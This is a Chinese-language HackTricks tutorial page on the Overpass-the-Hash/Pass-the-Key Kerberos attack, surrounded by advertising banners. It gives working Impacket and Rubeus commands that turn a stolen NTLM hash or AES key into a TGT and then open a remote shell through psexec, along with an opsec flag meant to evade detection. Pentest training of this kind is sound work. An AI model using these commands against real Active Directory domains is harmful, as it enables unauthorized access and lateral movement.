# Over Pass the Hash/Pass the Key

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**吗？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)**攻击旨在针对传统NTLM协议受限且Kerberos认证优先的环境。该攻击利用用户的NTLM哈希或AES密钥来获取Kerberos票据，从而未经授权地访问网络中的资源。

要执行此攻击，初始步骤涉及获取目标用户帐户的NTLM哈希或密码。在获得此信息后，可以获取帐户的票据授予票据（TGT），使攻击者能够访问用户具有权限的服务或计算机。

该过程可以通过以下命令启动：
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
对于需要使用AES256的情况，可以利用`-aesKey [AES key]`选项。此外，获取的票据可以与各种工具一起使用，包括smbexec.py或wmiexec.py，从而扩大攻击范围。

遇到诸如_PyAsn1Error_或_KDC cannot find the name_等问题通常可以通过更新Impacket库或使用主机名代替IP地址来解决，确保与Kerberos KDC兼容。

使用Rubeus.exe的另一种命令序列展示了这种技术的另一个方面：
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
这种方法反映了**通过密钥传递**的方法，重点是挪用并直接利用票证进行认证。值得注意的是，发起TGT请求会触发事件`4768：请求了一个Kerberos认证票证（TGT）`，默认情况下表示使用RC4-HMAC，尽管现代Windows系统更倾向于AES256。

为了符合运行安全性并使用AES256，可以应用以下命令：
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 参考

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* 你在**网络安全公司**工作吗？想要看到你的**公司在 HackTricks 中被宣传**吗？或者想要访问**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或**关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
